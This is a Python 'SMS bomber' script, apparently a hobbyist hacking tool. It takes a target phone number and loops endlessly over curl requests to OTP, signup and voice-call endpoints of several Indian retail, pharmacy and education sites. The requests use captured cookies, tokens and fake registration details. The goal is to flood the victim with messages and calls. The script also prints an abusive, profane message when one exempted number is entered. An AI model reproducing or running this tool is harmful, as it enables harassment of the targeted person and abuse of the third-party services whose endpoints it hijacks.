import os
import time


class Colours:
    white = "\033[1;37m"
    grey = "\033[0;37m"
    purple = "\033[0;35m"
    red = "\033[1;31m"
    green = "\033[1;32m"
    yellow = "\033[1;33m"
    Cyan = "\033[0;36m"
    Cafe = "\033[0;33m"
    Fiuscha = "\033[0;35m"
    blue = "\033[1;34m"


os.system("clear")
print("Your Bombing Tool is Starting ")
time.sleep(3)
os.system("clear")
try:
    time.sleep(2)
    file = open("Banner.txt", "r")
    if file.mode == "r":
        contents = file.read()
        print(Colours.red + contents)
except IOError:
    print('Banner File not Found')

print("==================================================================================================")
print("|--------------------------------" + Colours.green + "[" + Colours.yellow + "Powerful Bombing Script" + Colours.green + "]" + Colours.red + "---|-----------------------------------|")
print("|------------------------------------------------------------|----" + Colours.yellow + "Made By" + Colours.red + "----" + Colours.green + "[" + Colours.yellow + "DarkRebel" + Colours.green + "]" + Colours.red + "--------|")

print("")
print(Colours.green + "[" + Colours.Cyan + ">" + Colours.green + "]" + "Note        :" + Colours.yellow + "  This tool is only for Educational purpose")
print(Colours.green + "[" + Colours.Cyan + ">" + Colours.green + "]" + "Author      :" + Colours.yellow + "  DarkRebel")
print(Colours.green + "[" + Colours.Cyan + ">" + Colours.green + "]" + "Telegram    :" + Colours.yellow + "  @Dark_Rebell")
print(Colours.green + "[" + Colours.Cyan + ">" + Colours.green + "]" + "Github      :" + Colours.yellow + "  https://github.com/darkrebel777/Rbomb")
print(Colours.red + "==================================================================================================")
print("")
print(Colours.green + "[" + Colours.yellow + "1" + Colours.green + "]" + Colours.blue + "LET'S START BOMB")
print(Colours.green + "[" + Colours.yellow + "2" + Colours.green + "]" + Colours.blue + "EXIT")
print()
print(Colours.green + "[" + Colours.yellow + "DATE" + Colours.green + "]" + Colours.yellow )
os.system("date")
print("")
try:
    choose = int(input(
        Colours.red + "┌─[" + Colours.green + "Dark" + Colours.yellow + "@" + Colours.Cyan + "Rebel" + Colours.red + "]─[" + Colours.green + "SMS-RBomb" + Colours.red + "]\n"
                                                                                                                                                                           "└──╼" + Colours.yellow + " # " + Colours.green + "Choose an option" + Colours.yellow + " >> " + Colours.green))
    if choose == 1:
      target = input(Colours.red + "┌─[" + Colours.green + "Dark" + Colours.yellow + "@" + Colours.Cyan + "Rebel" + Colours.red + "]─[" + Colours.green + "SMS-RBomb" + Colours.red + "]\n"
      "└──╼" + Colours.yellow + " # " + Colours.green + "Enter a number without code" + Colours.yellow + " >> " + Colours.green)

      
      if target == "8427469274":
        print(Colours.green + "[" + Colours.red + "-" + Colours.green + "] " + Colours.red + "Are you a Whore ?, Dont you see whose number is this you'll gonna be fucked up and i am taking your mom")
        time.sleep(3)
        exit()
        
      else:
       print(Colours.green + "[" + Colours.yellow + "+" +Colours.green + "]" + Colours.yellow + "Bombing started on specified number")
       print(Colours.green + "[" + Colours.yellow + "+" +Colours.green + "]" + Colours.yellow + "press ctrl+z to stop then type exit to kill all jobs ")

       while True:
           os.system('''
           curl -X POST -H "Host: www.fbbonline.in" -H "content-length: 435" -H "accept: application/json, text/javascript, */*; q=0.01" -H "x-newrelic-id: VQ8PVlFUChABV1ZRBgYCX1w=" -H "x-requested-with: XMLHttpRequest" -H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36" -H "content-type: application/x-www-form-urlencoded; charset=UTF-8" -H "origin: https://www.fbbonline.in" -H "sec-fetch-site: same-origin" -H "sec-fetch-mode: cors" -H "sec-fetch-dest: empty" -H "referer: https://www.fbbonline.in/customer/account/checkoutcreate" -H "accept-encoding: gzip, deflate, br" -H "accept-language: en-US,en;q=0.9" -H "cookie: PHPSESSID=l79p1m44qqt2okvragufamej72" -H "cookie: _st_time=1601562961" -H "cookie: _fv=cmpnpp" -H "cookie: _fbp=fb.1.1601562989438.41952253" -H "cookie: activeCategories=s%3A12%3A%2240percentoff%22%3B" -H "cookie: activeFilters=s%3A27%3A%22%7B%22category%22%3A%2240percentoff%22%7D%22%3B" -H "cookie: rrUserId=8b9f6bf18b881409faee14f833956aca" -H "cookie: historyPlpPage=48" -H "cookie: scrollTopPosition=1" -H "cookie: historyProductCount=4"-H "cookie: historyProductSku=BU004TO76DQDINFUR" -H "cookie: historyPosition=1" -H "cookie: BU004TO76DQDINFUR_list=Polos" -H "cookie: pdSapSkus=s%3A155%3A%22%7B%22000001001496399001%22%3A%22XS%22%2C%22000001001496399002%22%3A%22S%22%2C%22000001001496399003%22%3A%22M%22%2C%22000001001496399004%22%3A%22L%22%2C%22000001001496399005%22%3A%22XL%22%2C%22000001001496399006%22%3A%22XXL%22%7D%22%3B" -H "cookie: recently_viewed_Sku=BU004TO76DQDINFUR" -H "cookie: all_store_details=null" -H "cookie: usr_crt=BU004TO76DQDINFUR-112646%3A1" -H "cookie: registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2Fcustomer%2Faccount%2FcheckoutLogin" -d "YII_CSRF_TOKEN=5c5551174a88bdb2f2c2f2b02a492211701e0e8c&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D='''+target+'''&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=ezioaudi207%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=Cyber&RegistrationForm%5Blast_name%5D=Mafia&RegistrationForm%5Bpassword%5D=cybermafia123&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" 'https://www.fbbonline.in/customer/account/GenerateOtp' > /dev/null 2>&1              
                 ''')
           os.system('''
           curl --http2 -X POST -H "Host:www.apollopharmacy.in" -H "content-length:17" -H "accept:*/*" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "origin:https://www.apollopharmacy.in" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.apollopharmacy.in/sociallogin/mobile/login/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:__cfduid=d98851bf93a8b640389d3448001b5a6361601659556" -H "cookie:PHPSESSID=5hi6on4q0uoomj7bhsl9846ce3" -H "cookie:_fbp=fb.1.1601659579198.1711590696" -H "cookie:__ta_device=vwcxwUYWQK6CjLE5qZfOO1jq1sIrSb1f" -H "cookie:__ta_visit=YsIgJNrxlThE7cK9qMyAAGRZdk6tswf7" -H "cookie:mage-translation-storage=%7B%7D" -H "cookie:mage-translation-file-version=%7B%7D" -H "cookie:__ta_ping=1" -H "cookie:mage-cache-storage=%7B%7D" -H "cookie:mage-cache-storage-section-invalidation=%7B%7D" -H "cookie:mage-cache-sessid=true" -H "cookie:mage-messages=" -H "cookie:section_data_ids=%7B%22customer%22%3A1601659380%2C%22compare-products%22%3A1601659380%2C%22last-ordered-items%22%3A1601659380%2C%22cart%22%3A1601660577%2C%22directory-data%22%3A1601659380%2C%22cadence-fbpixel-fpc%22%3A1601659380%2C%22review%22%3A1601659380%2C%22ammessages%22%3A1601659380%2C%22wishlist%22%3A1601659380%2C%22paypal-billing-agreement%22%3A1601659380%2C%22messages%22%3A1601660577%7D" -H "cookie:private_content_version=31193f5a756a200e2bcfd8a412d0f435" -H "cookie:AWSALB=ZCK07z5OGSQYuLfAHGqh467T00l+NIScVPXWs5s8f5hjvEoqawwouQiGidnvAY/lGoqzuyhC2+wATC4xbAy3u5VloSD8H7s8+7uXA3ecW3Ml7n49r1h36RUy2IrH" -H "cookie:AWSALBCORS=ZCK07z5OGSQYuLfAHGqh467T00l+NIScVPXWs5s8f5hjvEoqawwouQiGidnvAY/lGoqzuyhC2+wATC4xbAy3u5VloSD8H7s8+7uXA3ecW3Ml7n49r1h36RUy2IrH" -d "mobile='''+target+'''" "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/" > /dev/null 2>&1
                  ''')
           os.system('''
           curl --http2 -X POST -H "Host:grofers.com" -H "content-length:21" -H "app_client:consumer_web" -H "lon:77.040489" -H "device_id:90938812-ddb5-4d18-987b-60793f0776f1" -H "lat:28.4465616" -H "content-type:application/x-www-form-urlencoded" -H "user-agent:Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36" -H "auth_key:ca9d7b061dddb979562082a366c427610f53fe8ef500dadc80f8b0caf7a549fc" -H "accept:*/*" -H "origin:https://grofers.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://grofers.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:__cfduid=d475e610ddc76074e6a50d5c6f91118df1601697005" -H "cookie:gr_1_deviceId=90938812-ddb5-4d18-987b-60793f0776f1" -H "cookie:city=" -H "cookie:__cfruid=f91298f1a33a801955b8d5466280379b9d26d7ea-1601697005" -H "cookie:gr_1_lat=28.4640810758775" -H "cookie:gr_1_lon=76.9942133969929" -H "cookie:gr_1_locality=1849" -H "cookie:ajs_anonymous_id=%22a58f3267-aae0-434d-be9c-ecdef450b407%22" -H "cookie:WZRK_S_RKR-99Z-ZK5Z=%7B%22p%22%3A1%7D" -d "user_phone='''+target+'''" "https://grofers.com/v2/accounts/" > /dev/null 2>&1
                   ''')
           os.system('''
           curl -X GET -H "Host:api.tjori.com" -H "Connection:keep-alive" -H "Accept:application/json, text/plain, */*" -H "User-Agent:Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36" -H "Origin:https://www.tjori.com" -H "Sec-Fetch-Site:same-site" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Dest:empty" -H "Referer:https://www.tjori.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.9" "https://api.tjori.com/api/v2/otp/?number='''+target+'''&=&country_prefix=91" > /dev/null 2>&1
                   ''')
           os.system('''
           curl --http2 -X GET -H "Host:bcas-prod.byjusweb.com" -H "accept:*/*" -H "user-agent:Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded" -H "origin:https://byjus.com" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://byjus.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" "https://bcas-prod.byjusweb.com/api/voice?phoneNumber='''+target+'''&page=free-trial-classes" > /dev/null 2>&1
                   ''')
           os.system('''
           curl --http2 -X POST -H "Host:www.littledesire.com" -H "content-length:65" -H "accept:*/*" -H "x-requested-with:XMLHttpRequest" -H "user-agent:Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "origin:https://www.littledesire.com" -H "sec-fetch-site:same-origin" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://www.littledesire.com/register/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:__cfduid=db74c31b26da130b3e8df98be42153e4e1601928025" -H "cookie:PHPSESSID=isn5mrmtjks6rpf4samabcrfg5" -H "cookie:cookie_litrecentproducts=1600" -H "cookie:coock_litcurrency=INR" -H "cookie:coock_litcurrency_symbol=Rs." -H "cookie:coock_litcurrency_value=1" -H "cookie:_fbp=fb.1.1601928038653.1116247862" -H "cookie:coock_litcountryid=1" -H "cookie:coock_litcountry=India" -H "cookie:coock_litcountry_flag=t1415095440b1415114765_India-Flag.png" -d "name=Cyber+mafia&mobile='''+target+'''&emailID=cybermafia%40gmail.com" "https://www.littledesire.com/register/sendotp.php" > /dev/null 2>&1
                   ''')
           os.system('''
           curl --http2 -X POST -H "Host:bcas-prod.byjusweb.com" -H "content-length:46" -H "accept:*/*" -H "user-agent:Mozilla/5.0 (Linux; Android 10; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded" -H "origin:https://byjus.com" -H "sec-fetch-site:cross-site" -H "sec-fetch-mode:cors" -H "sec-fetch-dest:empty" -H "referer:https://byjus.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -d "phoneNumber='''+target+'''&page=free-trial-classes" "https://bcas-prod.byjusweb.com/api/send-otp" > /dev/null 2>&1
                   ''')
                   
    if choose == 2:
      print(Colours.green + "[" + Colours.red + "-" + Colours.green + "] " + Colours.yellow + "See you later")
      exit() 
    else:
      print(Colours.green + "[" + Colours.red + "-" + Colours.green + "] " + Colours.red + "Invalid Option")	
except KeyboardInterrupt:
 print(Colours.green + "[" + Colours.yellow + "+" +Colours.green + "]" + Colours.yellow + "STOPPING BOMBER!")
 exit()

